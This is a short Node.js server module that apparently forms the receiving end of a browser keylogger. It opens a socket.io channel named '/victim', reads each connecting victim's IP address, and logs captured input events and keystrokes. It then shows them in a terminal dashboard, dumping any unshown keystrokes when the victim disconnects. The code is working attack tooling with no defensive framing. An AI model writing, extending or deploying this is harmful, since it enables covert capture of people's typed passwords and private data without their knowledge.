 var path = require('path')
, express = require('express')
,     app = express()
,  events = require('events')
,  server = require('http').Server(app)
,      io = require('socket.io')(server)
,  victim

var exports = module.exports = new events.EventEmitter();

exports.mount = function(ui){
  exports.ui = ui
  app.use(express.static(path.join(__dirname, 'public')));
  victim = io
  .of('/victim')
  .on('connection', function(socket){
    client = socket.handshake.address.split(':')
    var log = []
    //console.log('√ ' + client[client.length - 1])
    socket.on('input', function(e){
     e.shown = 0
     if (e.type != 'key') {
       e.shown = 1
       log[e.id] = e
       exports.emit('output', {
         target: 'topRight'
       , message: "{bold}  :"+e.id+": {/bold} {red-fg} "+e.msg+" {/red-fg}"
       })
     }
     log[e.id] = e
    });
    socket.on('disconnect', function(){
     for (i in log)
       if (log[i].shown < 1)
         exports.emit('output', {
           target: 'topRight'
         , message: "{white-fg}  :"+log[i].id+": {/white-fg}{bold}{red-fg} "+log[i].msg+" {/red-fg}{/bold} \n"
         })
    });
  });
  server.listen(3000);
}
